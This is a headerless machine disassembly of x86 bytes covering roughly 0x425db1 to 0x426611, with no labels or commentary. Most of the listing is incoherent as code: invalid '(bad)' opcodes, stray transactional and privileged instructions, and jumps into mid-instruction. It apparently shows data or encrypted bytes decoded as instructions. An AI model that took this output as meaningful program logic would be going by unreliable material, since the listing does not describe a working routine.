  425db1:	in     al,dx
  425db2:	mov    dl,0x50
  425db4:	dec    edi
  425db5:	push   edx
  425db6:	dec    ebp
  425db7:	dec    ebp
  425db8:	dec    ebp
  425db9:	xor    BYTE PTR [edi+0x55],0x80
  425dbd:	lea    eax,[eax-0x687f7910]
  425dc3:	xchg   BYTE PTR [ebx+0x51],dl
  425dc6:	push   ebx
  425dc7:	xchg   esp,eax
  425dc8:	mov    dl,0xbe
  425dca:	or     al,0xb2
  425dcc:	clc    
  425dcd:	sub    edi,edi
  425dcf:	(bad)  
  425dd0:	push   eax
  425dd1:	xend   
  425dd4:	dec    ebp
  425dd5:	dec    ebp
  425dd6:	dec    ebp
  425dd7:	xor    BYTE PTR [edi+0x21],0x80
  425ddb:	lea    eax,[eax-0x687f7510]
  425de1:	mov    dl,BYTE PTR [ebx+0x51]
  425de4:	mov    dl,0xbe
  425de6:	or     al,0x80
  425de8:	ins    DWORD PTR es:[edi],dx
  425de9:	or     dl,BYTE PTR [ebx-0x6c]
  425dec:	mov    dl,0xf8
  425dee:	sub    edi,edi
  425df0:	(bad)  
  425df1:	push   eax
  425df2:	xend   
  425df5:	dec    ebp
  425df6:	dec    ebp
  425df7:	dec    ebp
  425df8:	xor    BYTE PTR [edi+0x1d],0x80
  425dfc:	lock sbb eax,0xbab21153
  425e02:	sub    DWORD PTR [ebx-0x4],edx
  425e05:	mov    dl,0x86
  425e07:	or     al,0xff
  425e09:	mov    dl,0x80
  425e0b:	lock mov al,BYTE PTR [eax-0x6bac7569]
  425e12:	push   ebx
  425e13:	push   ecx
  425e14:	mov    dl,0xf8
  425e16:	sub    DWORD PTR [edx-0x100f342],esi
  425e1c:	adc    BYTE PTR [edi-0x75587f76],0x53
  425e23:	jle    0x425dd7
  425e25:	pop    es
  425e26:	or     al,0xed
  425e28:	(bad)  
  425e29:	or     eax,0xff29b4b2
  425e2e:	xchg   esp,eax
  425e2f:	in     al,dx
  425e30:	(bad)  
  425e31:	push   eax
  425e32:	xend   
  425e35:	dec    ebp
  425e36:	dec    ebp
  425e37:	dec    ebp
  425e38:	xor    BYTE PTR [edi-0x76],0x80
  425e3c:	lock mov ch,ch
  425e3f:	add    eax,0x29bab20d
  425e44:	push   ebx
  425e45:	cld    
  425e46:	mov    dl,0x86
  425e48:	or     al,0xff
  425e4a:	mov    dl,0x80
  425e4c:	lock mov al,BYTE PTR [eax-0x3d127569]
  425e53:	or     eax,0xf8b25153
  425e58:	sub    DWORD PTR [edx-0x100f342],esi
  425e5e:	in     al,dx
  425e5f:	mov    dl,0x80
  425e61:	lock mov al,BYTE PTR [eax-0x3d127569]
  425e68:	or     eax,0xf8b25153
  425e6d:	sub    DWORD PTR [edx-0x100f342],esi
  425e73:	add    DWORD PTR [eax],ebx
  425e75:	push   edx
  425e76:	dec    ebp
  425e77:	dec    ebp
  425e78:	dec    ebp
  425e79:	stos   BYTE PTR es:[edi],al
  425e7a:	adc    BYTE PTR [edi-0x75587f76],0xec
  425e81:	mov    dl,0x53
  425e83:	jle    0x425e86
  425e85:	lock adc DWORD PTR [eax+0x41],0x4f
  425e8a:	aad    0x4d
  425e8c:	dec    ebp
  425e8d:	dec    ebp
  425e8e:	xor    BYTE PTR [edi+0x2d],0xed
  425e92:	(bad)  
  425e93:	or     eax,0xb20c07b2
  425e98:	mov    ah,0x29
  425e9a:	call   DWORD PTR [ecx+eax*1-0x727277f0]
  425ea1:	lea    eax,[eax-0x72c5c133]
  425ea7:	lea    ebp,[edx+0x4d814d96]
  425ead:	xchg   edi,eax
  425eae:	and    eax,0xbdd56a4f
  425eb3:	xor    BYTE PTR [edi-0x79],0x80
  425eb7:	lock xor cl,BYTE PTR [ecx]
  425eba:	inc    esi
  425ebb:	std    
  425ebc:	or     al,0xb2
  425ebe:	mov    esi,0x80b6800c
  425ec3:	std    
  425ec4:	xor    BYTE PTR [edi-0x79],0x80
  425ec8:	xchg   edi,eax
  425ec9:	xor    dl,BYTE PTR [ebx+0x72]
  425ecc:	push   ebx
  425ecd:	sub    dh,BYTE PTR [edx+0x77802984]
  425ed3:	and    edi,edi
  425ed5:	inc    BYTE PTR [eax+0xada6371]
  425edb:	adc    BYTE PTR [edi-0x7faa3bab],0xc
  425ee2:	and    BYTE PTR [edi-0xda707f],0x10
  425ee9:	and    eax,0xc87780ef
  425eee:	xor    al,0x8b
  425ef1:	or     DWORD PTR [esi-0x3],eax
  425ef4:	or     al,0xb2
  425ef6:	mov    esi,0xc8f0800c
  425efb:	and    BYTE PTR [edi+0x537c538b],0xa4
  425f02:	mov    dl,0xba
  425f04:	sub    DWORD PTR [eax+0x74ff71f0],eax
  425f0a:	in     al,dx
  425f0b:	std    
  425f0c:	xor    BYTE PTR [edi+0x21],0x80
  425f10:	sbb    eax,0x500a0063
  425f15:	lock jno 0x425efc
  425f18:	jl     0x425ede
  425f1a:	outs   dx,DWORD PTR ds:[esi]
  425f1b:	adc    BYTE PTR [edi+0x21778055],0x80
  425f22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f23:	xor    BYTE PTR [eax+0x50659fec],0x1d
  425f2a:	sbb    BYTE PTR ds:0x80eca680,0x2e
  425f31:	lea    ecx,[ebp+0x71f0508d]
  425f37:	and    BYTE PTR [esi+0x4381a780],0x11
  425f3e:	and    BYTE PTR [edi-0x7f00af11],0x8d
  425f45:	and    BYTE PTR [esi-0x7fc28214],0x77
  425f4c:	xchg   DWORD PTR [eax-0x10],edx
  425f4f:	scas   eax,DWORD PTR es:[edi]
  425f50:	xor    al,0x32
  425f53:	or     DWORD PTR [esi-0x3],eax
  425f56:	or     al,0xb2
  425f58:	mov    esi,0x87f0800c
  425f5d:	and    BYTE PTR [edi+0x537c5332],0xa4
  425f64:	mov    dl,0xba
  425f66:	sub    edi,edi
  425f68:	je     0x425fba
  425f6a:	ja     0x425fb1
  425f6c:	xor    BYTE PTR [edi+0x71],0xbe
  425f70:	lds    edi,FWORD PTR [edx]
  425f72:	lea    ecx,[ebp-0x7f788880]
  425f78:	lock xor cl,BYTE PTR [ecx]
  425f7b:	inc    esi
  425f7c:	std    
  425f7d:	or     al,0xb2
  425f7f:	mov    esi,0x87f0800c
  425f84:	and    BYTE PTR [edi+0x29bab232],0x80
  425f8b:	lock adc eax,0xa4537c53
  425f91:	in     eax,dx
  425f92:	mov    dl,0x8b
  425f94:	push   DWORD PTR [esi+esi*4-0x42]
  425f98:	arpl   WORD PTR [edx-0x72f412f7],si
  425f9e:	lea    ecx,[ebp+0x171a780]
  425fa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425fa5:	jae    0x425f96
  425fa7:	inc    ebx
  425fa8:	std    
  425fa9:	push   eax
  425faa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425fab:	xor    eax,0x803df050
  425fb0:	lock test DWORD PTR [eax+0x46097a77],0x86b20cb2
  425fbb:	or     al,0x80
  425fbd:	ja     0x425fb6
  425fbf:	and    BYTE PTR [edi+0x2984b27a],0x80
  425fc6:	ja     0x425f90
  425fc8:	push   ebx
  425fc9:	sub    dl,BYTE PTR [ebx-0x5c]
  425fcc:	call   DWORD PTR [ecx]
  425fce:	and    BYTE PTR [edi-0x7db9f675],0xc
  425fd5:	push   eax
  425fd6:	ja     0x42602d
  425fd8:	xor    BYTE PTR [edi-0x38],0x6e
  425fdc:	out    0x55,eax
  425fde:	in     eax,dx
  425fdf:	mov    dl,0xa6
  425fe1:	mov    dl,0xc4
  425fe3:	or     al,0x80
  425fe5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425fe6:	mov    edx,DWORD PTR [ebx-0x5c]
  425fe9:	xor    BYTE PTR [edi+0x55b79455],ah
  425fef:	and    BYTE PTR [edi-0x740f7f38],0x9
  425ff6:	inc    esi
  425ff7:	adc    DWORD PTR [edx+esi*4],ecx
  425ffa:	test   BYTE PTR [ecx],ch
  425ffc:	xor    BYTE PTR [edi-0x38],0xb2
  426000:	mov    esi,0x8bf0800c
  426005:	push   ebx
  426006:	jo     0x425fba
  426008:	test   BYTE PTR [ecx],ch
  42600a:	xor    BYTE PTR [edi+0x55],0x53
  42600e:	lods   al,BYTE PTR ds:[esi]
  42600f:	jmp    DWORD PTR [eax+0x935f080]
  426015:	pop    esp
  426016:	xor    BYTE PTR [ebx+0x74],al
  426019:	xor    esi,DWORD PTR [edx+0x50f7f080]
  42601f:	ja     0x426076
  426021:	xor    BYTE PTR [edi+0x7a],0x9
  426025:	inc    esi
  426026:	mov    dl,0xc
  426028:	mov    dl,0x86
  42602a:	or     al,0x80
  42602c:	ja     0x426025
  42602e:	and    BYTE PTR [edi+0x2984b27a],0x80
  426035:	ja     0x42606c
  426037:	or     DWORD PTR [ebp+ecx*4-0x33],ebx
  42603b:	add    eax,0xa6a453a7
  426040:	adc    ebp,ecx
  426042:	mov    dl,0xa6
  426044:	xchg   esp,eax
  426045:	xchg   BYTE PTR [ebx+0x70],dl
  426048:	xchg   BYTE PTR fs:[edi+0x36092643],cl
  42604f:	mov    dl,0xc
  426051:	mov    dl,0x84
  426053:	or     al,0x57
  426055:	fstp   DWORD PTR [eax-0x21]
  426058:	adc    DWORD PTR [ebx+0x11],edx
  42605b:	addr16 out 0x58,al
  42605e:	fist   WORD PTR [ecx]
  426060:	xlat   BYTE PTR ds:[ebx]
  426061:	aaa    
  426062:	arpl   WORD PTR [ecx],dx
  426064:	xlat   BYTE PTR ds:[ebx]
  426065:	dec    esi
  426066:	or     BYTE PTR [eax+eax*4],0xf0
  42606a:	jno    0x426058
  42606c:	cmp    al,BYTE PTR [eax+0x65ed55f0]
  426072:	out    dx,eax
  426073:	(bad)  
  426074:	aad    0xe
  426076:	or     BYTE PTR [eax+eax*4],0xf0
  42607a:	jno    0x426068
  42607c:	cmp    al,BYTE PTR [eax+0x77eceff0]
  426082:	push   ebp
  426083:	xor    BYTE PTR [eax],0x3a
  426086:	out    dx,eax
  426087:	in     eax,dx
  426088:	ja     0x4260bf
  42608a:	or     al,0x4d
  42608c:	lock cmp eax,0x4d234f09
  426092:	dec    ebp
  426093:	dec    ebp
  426094:	les    ebp,FWORD PTR [edi]
  426096:	xchg   BYTE PTR fs:[edi+0x77802643],cl
  42609d:	adc    eax,0x7c45773a
  4260a2:	ja     0x42610e
  4260a4:	rcr    BYTE PTR [eax-0x21],1
  4260a7:	adc    DWORD PTR [eax-0x59],edx
  4260aa:	jbe    0x42602c
  4260ac:	ja     0x426118
  4260ae:	xor    al,0x76
  4260b1:	or     DWORD PTR [esi-0x3],eax
  4260b4:	or     al,0xb2
  4260b6:	mov    esi,0x6af0800c
  4260bb:	and    BYTE PTR [edi+0x29bab276],0x80
  4260c2:	lock and DWORD PTR [eax+0x537c5330],eax
  4260c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4260ca:	push   DWORD PTR [ecx+eax*1+0x75]
  4260ce:	mov    dl,0xe5
  4260d0:	xor    al,0x45
  4260d3:	arpl   di,bp
  4260d5:	rcl    DWORD PTR [ebp-0x80],cl
  4260d8:	ja     0x42614b
  4260da:	in     al,dx
  4260db:	ja     0x4260f2
  4260dd:	push   eax
  4260de:	ja     0x426151
  4260e0:	sub    BYTE PTR [ebp-0x12],0x50
  4260e4:	ja     0x4260fb
  4260e6:	xor    BYTE PTR [edi-0x79],0x80
  4260ea:	lock xor cl,BYTE PTR [ecx]
  4260ed:	inc    esi
  4260ee:	std    
  4260ef:	or     al,0xb2
  4260f1:	mov    esi,0x87f0800c
  4260f6:	and    BYTE PTR [edi+0x53a45332],0x7c
  4260fd:	push   DWORD PTR [edx+esi*4-0x46]
  426101:	sub    DWORD PTR [edi+0x77],ebx
  426104:	adc    eax,0xdbf4f09
  426109:	dec    ebp
  42610a:	dec    ebp
  42610b:	xor    al,0x8a
  42610e:	adc    BYTE PTR [edi-0x4daeac76],0xbe
  426115:	or     al,0xe2
  426117:	or     eax,0xb2f7539d
  42611c:	clc    
  42611d:	sub    edi,edi
  42611f:	inc    BYTE PTR [eax-0x587f7569]
  426125:	mov    dl,BYTE PTR [ebx+0x7e]
  426128:	mov    dl,0x7
  42612a:	or     al,0x53
  42612c:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  426133:	inc    BYTE PTR [eax-0x587f7569]
  426139:	mov    dl,BYTE PTR [ebx+0x7e]
  42613c:	mov    dl,0x7
  42613e:	or     al,0x53
  426140:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  426147:	inc    BYTE PTR [eax-0x587f7569]
  42614d:	mov    dl,BYTE PTR [ebx+0x7e]
  426150:	push   ebx
  426151:	xor    BYTE PTR [edx-0x4b4df3f9],0x29
  426158:	call   DWORD PTR [esp+ebp*8+0x520150fe]
  42615f:	dec    ebp
  426160:	dec    ebp
  426161:	dec    ebp
  426162:	xor    al,0x81
  426165:	adc    BYTE PTR [edi-0x79587f7a],0x53
  42616c:	jle    0x4261c1
  42616e:	xor    BYTE PTR [edx-0x4b4df3f9],0x29
  426175:	call   DWORD PTR [eax+edx*2+0x4dd51841]
  42617c:	dec    ebp
  42617d:	dec    ebp
  42617e:	xor    al,0x21
  426181:	xor    BYTE PTR [eax],0x80
  426184:	xchg   edi,eax
  426185:	mov    al,BYTE PTR [eax+0x7f808aa7]
  42618b:	or     dl,BYTE PTR [ebx+0x7e]
  42618e:	push   ebx
  42618f:	xor    BYTE PTR [edx-0x4b4df3f9],0x29
  426196:	call   DWORD PTR [eax+edx*2+0x4dd51841]
  42619d:	dec    ebp
  42619e:	dec    ebp
  42619f:	xor    al,0x1d
  4261a2:	adc    BYTE PTR [edi-0x4d08ace3],0xf8
  4261a9:	sub    DWORD PTR [ebx+0x51],edx
  4261ac:	mov    dl,0xbe
  4261ae:	or     al,0xff
  4261b0:	inc    BYTE PTR [eax-0x587f7569]
  4261b6:	mov    dl,BYTE PTR [ebx-0x7e]
  4261b9:	xor    BYTE PTR [edi-0x76],0x53
  4261bd:	jle    0x426171
  4261bf:	mov    ah,0x29
  4261c1:	mov    dl,0x7
  4261c3:	or     al,0xff
  4261c5:	xchg   esp,eax
  4261c6:	and    BYTE PTR [edi-0x1203ac76],0xc6
  4261cd:	or     eax,0xb20c86b2
  4261d2:	mov    ah,0x29
  4261d4:	push   DWORD PTR [esp+ebp*8-0x9]
  4261d8:	push   eax
  4261d9:	inc    ecx
  4261da:	sbb    ch,dl
  4261dc:	dec    ebp
  4261dd:	dec    ebp
  4261de:	dec    ebp
  4261df:	xor    al,0x8a
  4261e2:	adc    BYTE PTR [edi-0x4daeac76],0xbe
  4261e9:	or     al,0xe2
  4261eb:	or     eax,0xb2f7539d
  4261f0:	clc    
  4261f1:	sub    edi,edi
  4261f3:	inc    BYTE PTR [eax-0x587f7569]
  4261f9:	mov    dl,BYTE PTR [ebx+0x7e]
  4261fc:	mov    dl,0x7
  4261fe:	or     al,0x53
  426200:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  426207:	inc    BYTE PTR [eax-0x587f7569]
  42620d:	mov    dl,BYTE PTR [ebx+0x7e]
  426210:	mov    dl,0x7
  426212:	or     al,0x53
  426214:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  42621b:	inc    BYTE PTR [ecx]
  42621d:	xchg   edi,eax
  42621e:	adc    DWORD PTR [eax+0x16],0x1
  426222:	aad    0x4d
  426224:	dec    ebp
  426225:	dec    ebp
  426226:	add    DWORD PTR [ecx],eax
  426228:	push   edx
  426229:	dec    ebp
  42622a:	dec    ebp
  42622b:	dec    ebp
  42622c:	xchg   esi,eax
  42622d:	xor    al,0x8a
  426230:	adc    BYTE PTR [edi-0x7faeac76],0xd7
  426237:	sub    eax,0xbeb2f753
  42623c:	or     al,0xb2
  42623e:	clc    
  42623f:	sub    edi,edi
  426241:	(bad)  
  426242:	xchg   esi,eax
  426243:	add    DWORD PTR [eax+ecx*4-0x73],ecx
  426247:	lea    ecx,[ebp+0x3e4c800a]
  42624d:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  426253:	xchg   edi,eax
  426254:	and    eax,0x3acd4c80
  426259:	lea    ecx,[ebp-0x7fde88b0]
  42625f:	ja     0x426250
  426261:	sub    bh,0xec
  426264:	lock and DWORD PTR [eax-0x10],edx
  426268:	and    DWORD PTR [eax-0x687f3710],eax
  42626e:	mov    ecx,DWORD PTR [ecx]
  426270:	inc    esi
  426271:	mov    dh,0xc
  426273:	mov    dl,0x7
  426275:	or     al,0x80
  426277:	xchg   edi,eax
  426278:	enter  0xd780,0x8b
  42627c:	push   ebx
  42627d:	or     esi,DWORD PTR [edx-0x687fd608]
  426283:	enter  0x2a53,0xff
  426287:	push   ecx
  426288:	adc    bh,0x8b
  42628b:	or     DWORD PTR [esi-0x3e],eax
  42628e:	or     al,0xb2
  426290:	mov    BYTE PTR [eax+eax*4],cl
  426293:	xlat   BYTE PTR ds:[ebx]
  426294:	enter  0xa780,0x8b
  426298:	push   ebx
  426299:	pushf  
  42629a:	push   ebx
  42629b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42629c:	call   DWORD PTR [esp+ebp*8-0x37687f02]
  4262a3:	mov    dl,0x2
  4262a5:	sub    DWORD PTR [eax+0x46098bd7],eax
  4262ab:	ret    0xb20c
  4262ae:	mov    BYTE PTR [eax+eax*4],cl
  4262b1:	xlat   BYTE PTR ds:[ebx]
  4262b2:	enter  0xa780,0x8b
  4262b6:	push   ebx
  4262b7:	pushf  
  4262b8:	push   ebx
  4262b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4262ba:	call   DWORD PTR [esp+ebp*8-0x37687f02]
  4262c1:	mov    dl,0x2
  4262c3:	sub    DWORD PTR [eax+0x46098bd7],eax
  4262c9:	ret    0xb20c
  4262cc:	mov    BYTE PTR [eax+eax*4],cl
  4262cf:	xlat   BYTE PTR ds:[ebx]
  4262d0:	enter  0x9c53,0x80
  4262d4:	out    0x8b,eax
  4262d6:	push   ebx
  4262d7:	dec    ebp
  4262d8:	call   FWORD PTR [esp+ebp*8+0x4d0a96fe]
  4262df:	xlat   BYTE PTR ds:[ebx]
  4262e0:	and    DWORD PTR [edx-0x6979d6fe],esi
  4262e6:	xchg   DWORD PTR [ebp+0x4d],ecx
  4262e9:	xor    BYTE PTR [edi-0x51],0xab
  4262ed:	test   eax,0x81fb70a3
  4262f2:	lea    edx,[edi-0x78127880]
  4262f8:	inc    ebp
  4262f9:	xchg   ebx,eax
  4262fa:	cdq    
  4262fb:	fwait
  4262fc:	push   ebx
  4262fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4262fe:	push   ebx
  4262ff:	jo     0x42637d
  426301:	ja     0x426285
  426303:	fstp   DWORD PTR [eax-0x21]
  426306:	adc    DWORD PTR [esi-0x7a],ebx
  426309:	pop    DWORD PTR [ebx+0x26]
  42630c:	push   eax
  42630d:	ja     0x426292
  42630f:	jl     0x426388
  426311:	xchg   ah,ah
  426313:	pop    eax
  426314:	fist   WORD PTR [ecx]
  426316:	push   eax
  426317:	ja     0x4262a0
  426319:	jl     0x426392
  42631b:	xchg   esi,esi
  42631d:	mov    ds:0x777c386f,eax
  426322:	enter  0xe9f6,0x6f
  426326:	cmp    BYTE PTR [edi+esi*2+0x32],bh
  42632a:	cli    
  42632b:	and    al,0x6f
  42632d:	cmp    BYTE PTR [edi+esi*2+0x32],bh
  426331:	hlt    
  426332:	and    al,0x6f
  426334:	cmp    BYTE PTR [edi+esi*2-0x75],bh
  426338:	mul    BYTE PTR [esi+ebp*8]
  42633b:	cmp    BYTE PTR [ecx],al
  42633d:	ja     0x42632d
  42633f:	push   eax
  426340:	ja     0x4262cd
  426342:	xor    BYTE PTR [edi+0x1d],0x80
  426346:	bound  esi,QWORD PTR [esi]
  426348:	cmp    cl,BYTE PTR [ebp+0x1d77808d]
  42634e:	xor    al,0x1d
  426351:	or     ch,0x2e
  426354:	cmp    cl,BYTE PTR [ebp-0x7f8e7f73]
  42635a:	pop    ebp
  42635b:	in     al,dx
  42635c:	out    0x65,al
  42635e:	adc    BYTE PTR [edi+0x26508082],0x3a
  426365:	lea    ecx,[ebp-0x7f0618b0]
  42636b:	out    0x83,eax
  42636d:	or     DWORD PTR [esi-0x7b],eax
  426370:	or     al,0xb2
  426372:	popa   
  426373:	or     al,0x80
  426375:	out    0x82,eax
  426377:	and    BYTE PTR [edi-0x583d5d7d],0xc7
  42637e:	add    al,0xd4
  426380:	push   ebx
  426381:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426382:	mov    dl,0xbc
  426384:	sub    DWORD PTR [eax+0x6394ff5f],eax
  42638a:	pushf  
  42638b:	xlat   BYTE PTR ds:[ebx]
  42638c:	push   edx
  42638d:	sbb    BYTE PTR [ecx],0x50
  426390:	xchg   edi,eax
  426391:	mov    eax,DWORD PTR [eax-0x687fea69]
  426397:	jno    0x426319
  426399:	xchg   edi,eax
  42639a:	and    DWORD PTR [ecx],eax
  42639c:	xchg   edi,eax
  42639d:	test   BYTE PTR [edx-0x697428b3],ch
  4263a3:	or     bl,BYTE PTR [ecx+0x11dd74d]
  4263a9:	ja     0x4263a4
  4263ab:	dec    ebp
  4263ac:	xlat   BYTE PTR ds:[ebx]
  4263ad:	out    dx,eax
  4263ae:	dec    ebp
  4263af:	xlat   BYTE PTR ds:[ebx]
  4263b0:	enter  0xd74d,0x32
  4263b4:	dec    ebp
  4263b5:	xlat   BYTE PTR ds:[ebx]
  4263b6:	xchg   DWORD PTR [edx],ecx
  4263b8:	add    DWORD PTR [edi-0x76],esi
  4263bb:	or     al,BYTE PTR [esi+0x4d4d4bab]
  4263c1:	push   eax
  4263c2:	ja     0x4263e1
  4263c4:	xor    BYTE PTR [edi+0x1d],0x80
  4263c8:	lock and eax,0x80159250
  4263ce:	ja     0x4263f5
  4263d0:	jl     0x42635f
  4263d2:	in     al,dx
  4263d3:	lea    ecx,[ebp-0x7b887f73]
  4263d9:	xor    al,0x25
  4263dc:	push   eax
  4263dd:	xchg   edx,eax
  4263de:	out    dx,al
  4263df:	xor    BYTE PTR [edi+0x71],0x80
  4263e3:	lock and eax,0x80ef9250
  4263e9:	ja     0x426400
  4263eb:	xor    al,0x25
  4263ee:	push   eax
  4263ef:	xchg   edx,eax
  4263f0:	and    DWORD PTR [eax+0x6d7c2577],eax
  4263f6:	and    eax,0x8d8d8d3a
  4263fb:	les    ebx,FWORD PTR [edi]
  4263fd:	xor    BYTE PTR [edi+0x1d],0x80
  426401:	lock sbb eax,0x3a2ecd80
  426407:	lea    ecx,[ebp+0x3a265080]
  42640d:	lea    ecx,[ebp+0x3a438d80]
  426413:	push   eax
  426414:	ja     0x4263a0
  426416:	xor    BYTE PTR [edi-0x76],0xab
  42641a:	test   eax,0x1dfb70a3
  42641f:	lea    edx,[edi+0x77808780]
  426425:	and    DWORD PTR [edx-0x72c5c179],esp
  42642b:	lea    edx,[ebx-0x9986467]
  426431:	and    al,0x6f
  426433:	cmp    BYTE PTR [ecx],cl
  426435:	dec    edi
  426436:	mov    esi,0x808d8da6
  42643b:	ja     0x4264ae
  42643d:	addr16 cmc 
  42643f:	and    al,0x6f
  426441:	cmp    BYTE PTR [ecx],cl
  426443:	dec    edi
  426444:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426445:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426446:	lea    ecx,[ebp-0x26788884]
  42644c:	pop    eax
  42644d:	fist   WORD PTR [ecx]
  42644f:	pop    esi
  426450:	xchg   BYTE PTR [edi+0x77502643],cl
  426456:	xor    bh,BYTE PTR [edi+esi*2-0x7]
  42645a:	in     al,0x58
  42645c:	fist   WORD PTR [ecx]
  42645e:	push   eax
  42645f:	ja     0x4263e7
  426461:	xor    BYTE PTR [edi-0x11],0x50
  426465:	ja     0x42642f
  426467:	xor    BYTE PTR [edi-0x38],0x80
  42646b:	int    0x86
  42646d:	cmp    cl,BYTE PTR [ebp-0x7f727f73]
  426473:	lea    edx,[eax+0x77]
  426476:	mov    esp,DWORD PTR [eax+0x7f]
  426479:	cmp    BYTE PTR [ebp+0x38975e8d],cl
  42647f:	lea    ecx,[ebp+0x5a7750b9]
  426485:	in     eax,dx
  426486:	push   0xd
  426488:	mov    ecx,0x80d17750
  42648d:	mov    dl,0xb9
  42648f:	push   eax
  426490:	ja     0x4264a8
  426492:	pop    esi
  426493:	int3   
  426494:	cmp    BYTE PTR [ebp-0x46087f73],cl
  42649a:	push   eax
  42649b:	xchg   edi,eax
  42649c:	loope  0x42649f
  42649e:	push   edx
  42649f:	or     al,0x1
  4264a1:	lahf   
  4264a2:	stos   BYTE PTR es:[edi],al
  4264a3:	cmp    BYTE PTR [esi-0x47],0x50
  4264a7:	xchg   edi,eax
  4264a8:	push   ds
  4264a9:	adc    BYTE PTR [ecx+edi*4-0x121668b0],0xfb
  4264b1:	jle    0x42646c
  4264b3:	push   eax
  4264b4:	xchg   edi,eax
  4264b5:	int    0x1
  4264b7:	xchg   esi,eax
  4264b8:	push   ebp
  4264b9:	add    BYTE PTR [ebp-0x1518af47],0xed
  4264c0:	jl     0x42653c
  4264c2:	mov    ecx,0x10fe750
  4264c7:	fistp  WORD PTR [ecx-0x47]
  4264ca:	push   eax
  4264cb:	out    0x4c,eax
  4264cd:	mov    ecx,0xb9107750
  4264d2:	push   eax
  4264d3:	xlat   BYTE PTR ds:[ebx]
  4264d4:	pop    DWORD PTR [eax+0x7750b974]
  4264da:	inc    ecx
  4264db:	mov    ecx,0x4d6d1850
  4264e0:	dec    ebp
  4264e1:	dec    ebp
  4264e2:	in     eax,dx
  4264e3:	push   0x62
  4264e5:	mov    ecx,0x4dd84f50
  4264ea:	dec    ebp
  4264eb:	dec    ebp
  4264ec:	add    DWORD PTR [edx+0x4f50b985],edx
  4264f2:	jne    0x426541
  4264f4:	dec    ebp
  4264f5:	dec    ebp
  4264f6:	in     eax,dx
  4264f7:	push   0xffffffd4
  4264f9:	mov    ecx,0x4d794f50
  4264fe:	dec    ebp
  4264ff:	dec    ebp
  426500:	add    DWORD PTR [edx+0x4f50b971],edx
  426506:	jge    0x426555
  426508:	dec    ebp
  426509:	dec    ebp
  42650a:	in     eax,dx
  42650b:	push   0xffffffc0
  42650d:	mov    ecx,0x4dda4f50
  426512:	dec    ebp
  426513:	dec    ebp
  426514:	mov    ecx,0x4d310150
  426519:	dec    ebp
  42651a:	dec    ebp
  42651b:	xor    BYTE PTR [ecx+edi*4+0x50],0x4f
  426520:	mov    cl,0x4d
  426522:	dec    ebp
  426523:	dec    ebp
  426524:	xor    BYTE PTR [edi-0x79],0x80
  426528:	lock xor cl,BYTE PTR [ecx]
  42652b:	inc    esi
  42652c:	std    
  42652d:	or     al,0xb2
  42652f:	mov    esi,0x87f0800c
  426534:	adc    BYTE PTR [edi-0x385893ce],0x4
  42653b:	aam    0x53
  42653d:	jl     0x426592
  42653f:	jb     0x4264f3
  426541:	mov    edx,0xc4fbff29
  426546:	xchg   edx,eax
  426547:	add    ebp,edx
  426549:	ja     0x4265a5
  42654b:	mov    ecx,0x5c09a180
  426550:	sbb    DWORD PTR [ecx],ecx
  426552:	pop    esp
  426553:	jo     0x4265a8
  426555:	adc    DWORD PTR [edx-0x72c7163e],esp
  42655b:	lea    esi,[esi+0x9bab207]
  426561:	(bad)  
  426562:	(bad)  
  426563:	adc    BYTE PTR [ecx+0x2f],al
  426566:	or     DWORD PTR ds:0xf0804d4d,0xfffffff9
  42656d:	adc    BYTE PTR [edi-0x49b9f67a],0xc
  426574:	mov    dl,0x7
  426576:	or     al,0x80
  426578:	xchg   edi,eax
  426579:	stc    
  42657a:	adc    bh,0x86
  42657d:	push   ebx
  42657e:	sub    dl,BYTE PTR [ebx+0xb]
  426581:	call   DWORD PTR [ecx-0x4e]
  426584:	clc    
  426585:	sub    esp,ebp
  426587:	mov    dl,0xed
  426589:	mov    ebp,DWORD PTR [edi-0x29]
  42658c:	icebp  
  42658d:	xor    BYTE PTR [edi-0x79],0x80
  426591:	lock xor cl,BYTE PTR [ecx]
  426594:	inc    esi
  426595:	std    
  426596:	or     al,0xb2
  426598:	mov    esi,0x87f0800c
  42659d:	adc    BYTE PTR [edi+0x537c5332],0x72
  4265a4:	mov    dl,0xba
  4265a6:	sub    edi,edi
  4265a8:	sti    
  4265a9:	les    edx,FWORD PTR [edx-0x32882aff]
  4265af:	mov    ecx,0x5c09a180
  4265b4:	sbb    DWORD PTR [ecx],ecx
  4265b6:	pop    esp
  4265b7:	jo     0x42660c
  4265b9:	adc    DWORD PTR [edx-0x72c7163e],esp
  4265bf:	lea    esi,[esi+0x9bab207]
  4265c5:	(bad)  
  4265c6:	(bad)  
  4265c7:	adc    BYTE PTR [ecx+0x2f],al
  4265ca:	inc    ecx
  4265cb:	or     eax,0xf0804d4d
  4265d0:	stc    
  4265d1:	adc    BYTE PTR [edi-0x49b9f67a],0xc
  4265d8:	mov    dl,0x7
  4265da:	or     al,0x80
  4265dc:	xchg   edi,eax
  4265dd:	stc    
  4265de:	adc    bh,0x86
  4265e1:	push   ebx
  4265e2:	sub    dl,BYTE PTR [ebx+0xb]
  4265e5:	call   DWORD PTR [ecx-0x4e]
  4265e8:	clc    
  4265e9:	sub    esp,ebp
  4265eb:	mov    dl,0xed
  4265ed:	mov    ecx,DWORD PTR [edi+edx*8-0x78887f0f]
  4265f4:	xor    al,0x32
  4265f7:	or     DWORD PTR [esi-0x3],eax
  4265fa:	or     al,0xb2
  4265fc:	mov    esi,0x87f0800c
  426601:	adc    BYTE PTR [edi+0x537c5332],0x72
  426608:	mov    dl,0xba
  42660a:	sub    edi,edi
  42660c:	sti    
  42660d:	les    esi,FWORD PTR [ebp+0x1]
  426610:	push   esi
  426611:	ja     0x426680
